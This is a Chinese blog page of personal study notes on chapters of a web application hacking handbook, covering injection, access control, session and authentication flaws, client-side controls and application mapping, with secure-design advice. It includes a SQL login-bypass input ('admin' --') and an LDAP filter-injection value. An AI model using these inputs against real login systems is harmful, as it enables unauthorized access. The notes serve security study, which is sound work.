<h5 id="绕过登录"><a href="#绕过登录" class="headerlink" title="绕过登录"></a>绕过登录</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'$password'</span></span><br><span class="line"><span class="comment">-- $username = "admin' --"</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="comment">--' and password = 'password'</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><p>篇幅较多，好多熟悉的东西，暂时略过</p>
<h4 id="NoSQL-注入"><a href="#NoSQL-注入" class="headerlink" title="NoSQL 注入"></a>NoSQL 注入</h4><h5 id="MongoDB-注入"><a href="#MongoDB-注入" class="headerlink" title="MongoDB 注入"></a>MongoDB 注入</h5><p>如果直接使用字符串拼接，依然存在同样的问题。</p>
<h4 id="XPath-注入"><a href="#XPath-注入" class="headerlink" title="XPath 注入"></a>XPath 注入</h4><p>XML Path Language (XPath)</p>
<p>同样是字符串拼接</p>
<h4 id="LDAP-注入"><a href="#LDAP-注入" class="headerlink" title="LDAP 注入"></a>LDAP 注入</h4><p>Lightweight Directory Access Protocol (LDAP)</p>
<p>一般用于内网 Web 应用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(|(department&#x3D;London sales)(department&#x3D;Reading sales))</span><br><span class="line">)(department&#x3D;*</span><br><span class="line">(|(department&#x3D;London )(department&#x3D;*)(department&#x3D;Reading )(department&#x3D;*))</span><br></pre></td></tr></table></figure>

<h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%B9%9D%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/" data-id="ckbxqp6ei0001rsfe51sd0b77" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第八章：攻击访问控制" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%85%AB%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/" class="article-date">
  <time datetime="2020-06-26T08:43:42.392Z" itemprop="datePublished">2020-06-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%85%AB%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/">Web 应用黑客手册/第八章：攻击访问控制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="攻击访问控制"><a href="#攻击访问控制" class="headerlink" title="攻击访问控制"></a>攻击访问控制</h3><h4 id="公共漏洞"><a href="#公共漏洞" class="headerlink" title="公共漏洞"></a>公共漏洞</h4><p>访问控制可以分为三种：</p>
<ul>
<li>垂直访问控制——不同种类用户可以使用应用不同的功能，最简单的例子就是，普通用户和管理员</li>
<li>水平访问控制——比如不能访问别的用户的邮箱</li>
<li>上下文相关控制——确保用户只能执行在当前程序允许的操作（这个不太懂）</li>
</ul>
<h5 id="不受保护的功能"><a href="#不受保护的功能" class="headerlink" title="不受保护的功能"></a>不受保护的功能</h5><p>URL 本身就是秘密，知道 URL 就可以使用该功能。</p>
<h6 id="直接访问方法"><a href="#直接访问方法" class="headerlink" title="直接访问方法"></a>直接访问方法</h6><p>Java 插件中</p>
<h6 id="基于标识符的功能"><a href="#基于标识符的功能" class="headerlink" title="基于标识符的功能"></a>基于标识符的功能</h6><p>类似函数名</p>
<h6 id="多阶段功能"><a href="#多阶段功能" class="headerlink" title="多阶段功能"></a>多阶段功能</h6><p>讲过多次，验证不充分</p>
<h6 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h6><p>下载电子书</p>
<h6 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h6><p>比如，禁止普通用户对 /admin 目录的 POST 权限，但是，HEAD 和 POST 做相同的处理。</p>
<h5 id="不安全的访问控制方法"><a href="#不安全的访问控制方法" class="headerlink" title="不安全的访问控制方法"></a>不安全的访问控制方法</h5><h6 id="基于参数的访问控制"><a href="#基于参数的访问控制" class="headerlink" title="基于参数的访问控制"></a>基于参数的访问控制</h6><p>比如，product?admin=true</p>
<h6 id="基于引用的访问控制"><a href="#基于引用的访问控制" class="headerlink" title="基于引用的访问控制"></a>基于引用的访问控制</h6><p>基于 Referer header 也太荒谬了</p>
<h6 id="基于地理位置的访问控制"><a href="#基于地理位置的访问控制" class="headerlink" title="基于地理位置的访问控制"></a>基于地理位置的访问控制</h6><p>不可思议</p>
<h4 id="攻击访问控制-1"><a href="#攻击访问控制-1" class="headerlink" title="攻击访问控制"></a>攻击访问控制</h4><h5 id="测试不同的用户账号"><a href="#测试不同的用户账号" class="headerlink" title="测试不同的用户账号"></a>测试不同的用户账号</h5><p>买一堆 VIP ？先用高权限账号探索，然后用低权限账号探索</p>
<h5 id="测试多阶段功能"><a href="#测试多阶段功能" class="headerlink" title="测试多阶段功能"></a>测试多阶段功能</h5><p>如前所述</p>
<h5 id="用受限账号测试"><a href="#用受限账号测试" class="headerlink" title="用受限账号测试"></a>用受限账号测试</h5><h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%85%AB%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/" data-id="ckbxqp6es0003rsfe77jk897w" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第七章：攻击会话管理" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%B8%83%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/" class="article-date">
  <time datetime="2020-06-26T04:03:40.793Z" itemprop="datePublished">2020-06-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%B8%83%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/">Web 应用黑客手册/第七章：攻击会话管理</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="攻击会话管理"><a href="#攻击会话管理" class="headerlink" title="攻击会话管理"></a>攻击会话管理</h3><h4 id="状态是必须的"><a href="#状态是必须的" class="headerlink" title="状态是必须的"></a>状态是必须的</h4><p>HTTP 协议是无状态的。在 web 早期，静态网页也不需要状态。但是，现在的 web 应用需要区分不同用户，从而需要引入状态。</p>
<p>登录之前，用户名和密码是用户的标识；登录之后，会话令牌是用户的标识。</p>
<h4 id="令牌生成漏洞"><a href="#令牌生成漏洞" class="headerlink" title="令牌生成漏洞"></a>令牌生成漏洞</h4><h5 id="有意义的令牌"><a href="#有意义的令牌" class="headerlink" title="有意义的令牌"></a>有意义的令牌</h5><p>攻击者可以预测的令牌生成函数，比如有些应用根据用户名和邮箱来生成令牌。</p>
<h5 id="可预测的令牌"><a href="#可预测的令牌" class="headerlink" title="可预测的令牌"></a>可预测的令牌</h5><p>信息熵太低</p>
<p>如果采用强随机数生成算法，比如 GUID，这种问题完全可以避免，可能还有某些小公司会在这里出问题吧。</p>
<h4 id="令牌处理漏洞"><a href="#令牌处理漏洞" class="headerlink" title="令牌处理漏洞"></a>令牌处理漏洞</h4><h5 id="网上泄露令牌"><a href="#网上泄露令牌" class="headerlink" title="网上泄露令牌"></a>网上泄露令牌</h5><p>全站 HTTPS 即可解决</p>
<h5 id="日志中泄露令牌"><a href="#日志中泄露令牌" class="headerlink" title="日志中泄露令牌"></a>日志中泄露令牌</h5><p>假如系统日志被未授权访问，日志中有令牌，就会出问题。浏览器日志，服务器日志， Referer 日志等。</p>
<h5 id="令牌映射漏洞"><a href="#令牌映射漏洞" class="headerlink" title="令牌映射漏洞"></a>令牌映射漏洞</h5><p>同一时间多个令牌对应一个用户。</p>
<h5 id="会话中止漏洞"><a href="#会话中止漏洞" class="headerlink" title="会话中止漏洞"></a>会话中止漏洞</h5><p>会话有效期太久是不好的</p>
<h5 id="客户端令牌劫持"><a href="#客户端令牌劫持" class="headerlink" title="客户端令牌劫持"></a>客户端令牌劫持</h5><p>Hack steps：</p>
<ol>
<li>识别应用的跨站脚本漏洞</li>
<li>session fixation</li>
</ol>
<h5 id="Cookie-范围"><a href="#Cookie-范围" class="headerlink" title="Cookie 范围"></a>Cookie 范围</h5><h6 id="cookie-范围限制"><a href="#cookie-范围限制" class="headerlink" title="cookie 范围限制"></a>cookie 范围限制</h6><p>默认：cookie 只能应用到域名及其子域名</p>
<p>子域的网页可以设置高级域名的 cookie</p>
<h6 id="cookie-路径限制"><a href="#cookie-路径限制" class="headerlink" title="cookie 路径限制"></a>cookie 路径限制</h6><p>默认：cookie 会发送到子目录</p>
<h4 id="安全会话管理"><a href="#安全会话管理" class="headerlink" title="安全会话管理"></a>安全会话管理</h4><h5 id="令牌生成安全"><a href="#令牌生成安全" class="headerlink" title="令牌生成安全"></a>令牌生成安全</h5><p>128位强随机数</p>
<p>100 亿是 34 位，令牌的范围是 128 位的话，猜中的几率只有 </p>
<p>$$<br>2^{-94}<br>$$</p>
<p>几乎不可能猜中嘛</p>
<h5 id="保护令牌"><a href="#保护令牌" class="headerlink" title="保护令牌"></a>保护令牌</h5><ul>
<li>HTTPS</li>
<li>不能出现在 URL 中</li>
<li>要实现退出功能</li>
<li>令牌有效期</li>
<li>禁止同时登录</li>
</ul>
<p>等。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>令牌安全主要在于不可预测和防止被偷。</p>
<p>可预测性可以解决很多问题：安全的很多问题感觉都和可预测性有关。</p>
<h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/26/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%B8%83%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/" data-id="ckbxqp6b60000rsfeenzg6qvg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第六章：攻击认证" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/25/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E8%AE%A4%E8%AF%81/" class="article-date">
  <time datetime="2020-06-25T08:27:38.466Z" itemprop="datePublished">2020-06-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/25/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E8%AE%A4%E8%AF%81/">Web 应用黑客手册/第六章：攻击认证</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="攻击认证"><a href="#攻击认证" class="headerlink" title="攻击认证"></a>攻击认证</h3><h4 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h4><ul>
<li>HTML forms-based authentication</li>
<li>Multifactor mechanisms, such as those combining passwords and physical tokens</li>
<li>Client SSL certificates and/or smartcards</li>
<li>HTTP basic and digest authentication</li>
<li>Windows-integrated authentication using NTLM or Kerberos</li>
<li>Authentication services</li>
</ul>
<p>90% 应用使用用户名和密码认证。</p>
<h4 id="认证技术的设计缺陷"><a href="#认证技术的设计缺陷" class="headerlink" title="认证技术的设计缺陷"></a>认证技术的设计缺陷</h4><h5 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h5><p>许多 Web 应用不控制密码的质量</p>
<h5 id="暴力登录"><a href="#暴力登录" class="headerlink" title="暴力登录"></a>暴力登录</h5><p>尝试常见密码</p>
<h5 id="详细的错误信息"><a href="#详细的错误信息" class="headerlink" title="详细的错误信息"></a>详细的错误信息</h5><p>假如错误信息中告诉用户错误的是用户名或密码，可以借此收集用户名。</p>
<p>新用户注册，修改密码，也可以进行用户名枚举。</p>
<p>用户名和密码是多个输入参数的一种，假如在其他场景，比如多阶段功能，可以借助错误信息确认正确的参数。</p>
<p>有时候，返回错误的消息从浏览器看貌似一致，但是看 http 响应报文，则不一致。（能否根据报文处理时间来判断？）</p>
<p>除了枚举，还有其他方法来获取用户名，比如，邮箱，手机号，一般都是有效的用户名。</p>
<h5 id="有漏洞的凭据传输"><a href="#有漏洞的凭据传输" class="headerlink" title="有漏洞的凭据传输"></a>有漏洞的凭据传输</h5><h5 id="密码修改"><a href="#密码修改" class="headerlink" title="密码修改"></a>密码修改</h5><p>如果匿名用户可以访问密码修改功能：</p>
<ul>
<li>可以用于猜测用户名</li>
<li>如果不允许使用曾用密码，可以用于猜测密码</li>
<li>验证完已有密码之后，验证新密码和确认密码是否一致</li>
</ul>
<h5 id="忘记密码"><a href="#忘记密码" class="headerlink" title="忘记密码"></a>忘记密码</h5><p>恢复密码问题比密码简单</p>
<h5 id="记住我"><a href="#记住我" class="headerlink" title="记住我"></a>记住我</h5><ul>
<li>使用简单的持久化 cookie，rememberUser=xxx</li>
<li>使用序列号cookie，rememberUser=111</li>
<li>跨站脚本攻击劫持 cookie</li>
</ul>
<h5 id="凭据的不安全分发"><a href="#凭据的不安全分发" class="headerlink" title="凭据的不安全分发"></a>凭据的不安全分发</h5><p>比如，通过邮件发送密码或者激活链接，如果链接的构造可预测，就很危险</p>
<h4 id="认证技术的实现缺陷"><a href="#认证技术的实现缺陷" class="headerlink" title="认证技术的实现缺陷"></a>认证技术的实现缺陷</h4><h5 id="不正确的异常处理"><a href="#不正确的异常处理" class="headerlink" title="不正确的异常处理"></a>不正确的异常处理</h5><p>提交各种异常输入来 fuzz 应用</p>
<h5 id="多阶段登录机制的缺陷"><a href="#多阶段登录机制的缺陷" class="headerlink" title="多阶段登录机制的缺陷"></a>多阶段登录机制的缺陷</h5><p>多阶段登录的一般形式：</p>
<ol>
<li>用户名 + 密码</li>
<li>pin 码</li>
<li>物理设备产生的 code</li>
</ol>
<p>多阶段登录容易引入的不安全假设：</p>
<ul>
<li>假设处于步骤三的用户必然已经完成步骤一和步骤二</li>
<li>在步骤二阶段相信步骤一阶段服务器返回给用户的数据</li>
<li>假设每个步骤的用户是同一个</li>
</ul>
<p>可以在登录阶段，向用户提问曾经的问题，可能有的缺陷</p>
<ul>
<li>问题的答案也发送给客户端</li>
<li>不记录用户没有回答出来的问题，用户可以反复尝试，执导遇到自己知道的问题</li>
</ul>
<h5 id="不安全的存储"><a href="#不安全的存储" class="headerlink" title="不安全的存储"></a>不安全的存储</h5><ul>
<li>密码明文存储 </li>
<li>简单哈希存储</li>
</ul>
<h4 id="安全认证"><a href="#安全认证" class="headerlink" title="安全认证"></a>安全认证</h4><h5 id="保证凭据质量"><a href="#保证凭据质量" class="headerlink" title="保证凭据质量"></a>保证凭据质量</h5><ul>
<li>保证密码质量</li>
<li>用户名唯一</li>
<li>任何系统生成的数据都要有极高的信息熵，不可预测</li>
<li>允许用户设置较长的密码</li>
</ul>
<h5 id="安全处理凭据"><a href="#安全处理凭据" class="headerlink" title="安全处理凭据"></a>安全处理凭据</h5><ul>
<li>在凭据的处理流程中，不能出现未授权访问</li>
<li>客户端服务端通信使用 HTTPS</li>
<li>通过 POST 请求发送凭据到服务端。凭据不能放在 URL 参数和 cookie 中。凭据不能回传给客户端。</li>
<li>服务端不能存储明文密码</li>
<li>客户端的记住我功能，只能存储用户名</li>
<li>提供密码更改功能</li>
<li>通过邮件发给用户的密码要有有效期</li>
<li>使用小键盘输入密码</li>
</ul>
<h5 id="争取验证凭据"><a href="#争取验证凭据" class="headerlink" title="争取验证凭据"></a>争取验证凭据</h5><ul>
<li>验证流程的异常处理</li>
<li>多阶段登录小心</li>
<li>之前的验证结果不可信</li>
</ul>
<h5 id="防止信息泄露"><a href="#防止信息泄露" class="headerlink" title="防止信息泄露"></a>防止信息泄露</h5><ul>
<li>攻击者不能从错误信息中推测哪个参数错误</li>
<li>用同一个错误信息标识各种类型的错误</li>
<li>注册阶段用户名枚举：应用随机生成用户名或者邮箱注册</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我发现，密码的安全最终依赖手机和邮箱的安全啊。</p>
<h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/25/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E8%AE%A4%E8%AF%81/" data-id="ckbxqp6f10006rsfe8xj8b3vj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第五章：绕过客户端控制" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/25/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%BA%94%E7%AB%A0%EF%BC%9A%E7%BB%95%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8E%A7%E5%88%B6/" class="article-date">
  <time datetime="2020-06-25T07:51:32.458Z" itemprop="datePublished">2020-06-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/25/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%BA%94%E7%AB%A0%EF%BC%9A%E7%BB%95%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8E%A7%E5%88%B6/">Web 应用黑客手册/第五章：绕过客户端控制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="绕过客户端控制"><a href="#绕过客户端控制" class="headerlink" title="绕过客户端控制"></a>绕过客户端控制</h3><p>虽然 Web 安全的核心在于用户可以提交任意输入，但是，应用会在客户端做限制，突破限制才能提交任意输入。</p>
<h4 id="通过客户端传输数据"><a href="#通过客户端传输数据" class="headerlink" title="通过客户端传输数据"></a>通过客户端传输数据</h4><p>这种场景很常见：服务端发送数据给客户端，之后，客户端又把该数据回传给服务端。</p>
<p>Why？</p>
<ul>
<li>减少服务端需要保存的会话数据，按照 REST 的原则，服务端不应该保存任何客户端的状态信息</li>
<li>如果应用部署在不同的服务端，服务端需要的共享信息，需要借助客户端来维护</li>
<li>如果应用部署了第三方组件，也需要借助客户端保存信息</li>
<li>服务器保存信息的设计比较复杂，不利于测试，效率低，这也是 REST 受欢迎的原因吧</li>
</ul>
<p>然而，通过这种方式传输敏感信息是很危险的。</p>
<h5 id="隐藏表单属性"><a href="#隐藏表单属性" class="headerlink" title="隐藏表单属性"></a>隐藏表单属性</h5><p>表单的隐藏属性虽然不能通过点击浏览器修改，但是，可以直接拦截并修改 HTTP 报文。</p>
<p>（猜测一下，假如某东的个性化售价没有在服务端做校验会怎样？）</p>
<h5 id="Referer-Header"><a href="#Referer-Header" class="headerlink" title="Referer Header"></a>Referer Header</h5><p>多阶段功能，假如程序员对该字段作假设</p>
<h5 id="不透明数据"><a href="#不透明数据" class="headerlink" title="不透明数据"></a>不透明数据</h5><p>猜测加密手段</p>
<h4 id="捕获用户数据：HTML-表单"><a href="#捕获用户数据：HTML-表单" class="headerlink" title="捕获用户数据：HTML 表单"></a>捕获用户数据：HTML 表单</h4><h5 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h5><h5 id="脚本验证"><a href="#脚本验证" class="headerlink" title="脚本验证"></a>脚本验证</h5><h5 id="禁止元素"><a href="#禁止元素" class="headerlink" title="禁止元素"></a>禁止元素</h5><p>以上都可以轻松突破</p>
<h4 id="捕获浏览器插件数据"><a href="#捕获浏览器插件数据" class="headerlink" title="捕获浏览器插件数据"></a>捕获浏览器插件数据</h4><p>书中都是 java flash Silverlight 之类的东西，跳过</p>
<h4 id="安全处理客户端数据"><a href="#安全处理客户端数据" class="headerlink" title="安全处理客户端数据"></a>安全处理客户端数据</h4><p>鉴于 REST 的设计，客户端必然要存储大量数据，隐私数据在客户端是不可避免的。</p>
<p>所以，服务端对客户端来的数据都要校验，对于那些绕过客户端安全校验的数据，都要记录。</p>
<h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4><h5 id=""><a href="#" class="headerlink" title=""></a></h5>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/25/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E4%BA%94%E7%AB%A0%EF%BC%9A%E7%BB%95%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8E%A7%E5%88%B6/" data-id="ckbxqp6ev0004rsfe5gg9gmgg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第四章：映射应用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/22/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%9A%E6%98%A0%E5%B0%84%E5%BA%94%E7%94%A8/" class="article-date">
  <time datetime="2020-06-22T12:07:19.740Z" itemprop="datePublished">2020-06-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/22/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%9A%E6%98%A0%E5%B0%84%E5%BA%94%E7%94%A8/">Web 应用黑客手册/第四章：映射应用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="映射应用"><a href="#映射应用" class="headerlink" title="映射应用"></a>映射应用</h3><p>攻击的第一步是收集和考察应用的核心功能，理解应用。</p>
<h4 id="枚举内容和功能"><a href="#枚举内容和功能" class="headerlink" title="枚举内容和功能"></a>枚举内容和功能</h4><h5 id="Web-爬虫"><a href="#Web-爬虫" class="headerlink" title="Web 爬虫"></a>Web 爬虫</h5><p>Burp Suite</p>
<p>爬虫其实就是图遍历。麻烦之处在于有的网页只有在 post 之后才能看到。</p>
<p>robots.txt 是网站根目录下的文件，用于告诉爬虫工具，本站什么路径可以爬虫，什么路径不可以。在该文件中可以发现一下有趣的信息。比如，<a href="https://github.com/robots.txt，https://www.taobao.com/robots.txt" target="_blank" rel="noopener">https://github.com/robots.txt，https://www.taobao.com/robots.txt</a></p>
<p>缺点：</p>
<ul>
<li>不适应异常的导航机制，尤其是 js 比较多</li>
<li>多阶段功能，比如注册，登录</li>
<li>爬虫工具使用 url 标记网页，有的网页使用 form 实现功能，工具只会爬一次</li>
<li>有的网站需要登录才能访问</li>
</ul>
<p>潜在风险：有的网站比较垃圾，爬虫工具一个万一给删库了就得从入门到入狱了</p>
<h5 id="手动爬虫"><a href="#手动爬虫" class="headerlink" title="手动爬虫"></a>手动爬虫</h5><p>步骤：</p>
<ol>
<li>配置浏览器使用 Burp 代理</li>
<li>正常浏览网站</li>
<li>查看 Burp 的 map</li>
<li>Burp 自动爬虫</li>
</ol>
<h5 id="发现隐藏内容"><a href="#发现隐藏内容" class="headerlink" title="发现隐藏内容"></a>发现隐藏内容</h5><p>备份文件，新功能，调试功能，未移除功能，老版本文件，配置文件，源代码，注释，日志</p>
<h5 id="暴力枚举"><a href="#暴力枚举" class="headerlink" title="暴力枚举"></a>暴力枚举</h5><h5 id="从已发布内容推断"><a href="#从已发布内容推断" class="headerlink" title="从已发布内容推断"></a>从已发布内容推断</h5><p>Hack Steps</p>
<ol>
<li>观察手动+自动+暴力爬虫的结果</li>
<li>识别命名规则</li>
<li>审查客户端内容猜测隐藏的服务端内容</li>
<li>在枚举目录中添加发现的潜在路径</li>
<li>猜测开发人员可能会残留的临时文件</li>
<li>进一步自动爬虫</li>
</ol>
<h5 id="使用公共信息"><a href="#使用公共信息" class="headerlink" title="使用公共信息"></a>使用公共信息</h5><ul>
<li>搜索引擎</li>
<li>快照</li>
</ul>
<p>网站除了包含本站的 URL，也可能包含其他商业伙伴的 URL，比如，包含淘宝链接</p>
<p>Hack Steps</p>
<ol>
<li>使用不同的搜索引擎和快照搜索目标网站</li>
<li>使用高级搜索技巧，site,link,related</li>
<li>在 group 和 news 中搜索</li>
<li>看完之后，重复搜索</li>
<li>查看缓存</li>
<li>在应用的其他域名下查询</li>
</ol>
<p>如果查到了老内容和功能，有可能还在使用，老功能可能有漏洞</p>
<p>即使老功能已经移除，也可以提供线索</p>
<p>还可以从公共论坛上查看别人发的帖子</p>
<h5 id="利用-Web-服务器"><a href="#利用-Web-服务器" class="headerlink" title="利用 Web 服务器"></a>利用 Web 服务器</h5><p>有的 web 服务器的目录遍历漏洞</p>
<p>Niko 工具，用于扫描 web 服务器，检测已有漏洞</p>
<h5 id="发现隐藏内容-1"><a href="#发现隐藏内容-1" class="headerlink" title="发现隐藏内容"></a>发现隐藏内容</h5><p>使用 debug 关键字之类</p>
<h4 id="分析应用"><a href="#分析应用" class="headerlink" title="分析应用"></a>分析应用</h4><h5 id="识别用户输入的入口"><a href="#识别用户输入的入口" class="headerlink" title="识别用户输入的入口"></a>识别用户输入的入口</h5><ul>
<li>URL</li>
<li>URL 查询参数</li>
<li>POST 请求参数</li>
<li>cookie</li>
<li>HTTP 请求头</li>
</ul>
<h6 id="URL-路径"><a href="#URL-路径" class="headerlink" title="URL 路径"></a>URL 路径</h6><p>一般该路径对应 HTTP 请求的文件，但是，REST 风格的 URL 除外，参数也是路径的一部分</p>
<h6 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h6><p>一般都是 name=value  的格式，有一些自定义的参数格式，可能会含有意外收获</p>
<h6 id="HTTP-请求头"><a href="#HTTP-请求头" class="headerlink" title="HTTP 请求头"></a>HTTP 请求头</h6><p>HTTP 的 Referer 也可能会被应用作为输入来处理。</p>
<p>应用会根绝 User-Agent 来显示不同的内容，可以尝试。假如把  User-Agent  设置为手机，可能会返回一个简化版页面，更有可能出现问题。</p>
<p>X-Forwarded-For 伪造。</p>
<h6 id="带外信道"><a href="#带外信道" class="headerlink" title="带外信道"></a>带外信道</h6><p>HTTP 可能只是作为 运输层 来使用，比如基于 HTTP 的 SMTP 邮箱服务。</p>
<h6 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h6><p>通过 HTTP 响应的 Server header 可以获得服务器的版本信息，除此之外：</p>
<ul>
<li>HTML 模板</li>
<li>自定义 HTTP 头</li>
<li>URL 查询字符串参数</li>
</ul>
<p>都可以用于分析服务器版本信息</p>
<h6 id="HTTP-指纹"><a href="#HTTP-指纹" class="headerlink" title="HTTP 指纹"></a>HTTP 指纹</h6><p>HTTP 协议包含大量可选部分；不同的服务器有各自的特色。Web 服务器版本信息可以通过各种不同的信息区分出来。Httprecon  就是这种工具。</p>
<h6 id="文件扩展名"><a href="#文件扩展名" class="headerlink" title="文件扩展名"></a>文件扩展名</h6><ul>
<li>aspx — Microsoft ASP.NET</li>
<li>aspx — Microsoft ASP.NET</li>
<li>jsp — Java Server Pages</li>
<li>cfm — Cold Fusion</li>
<li>php — The PHP language</li>
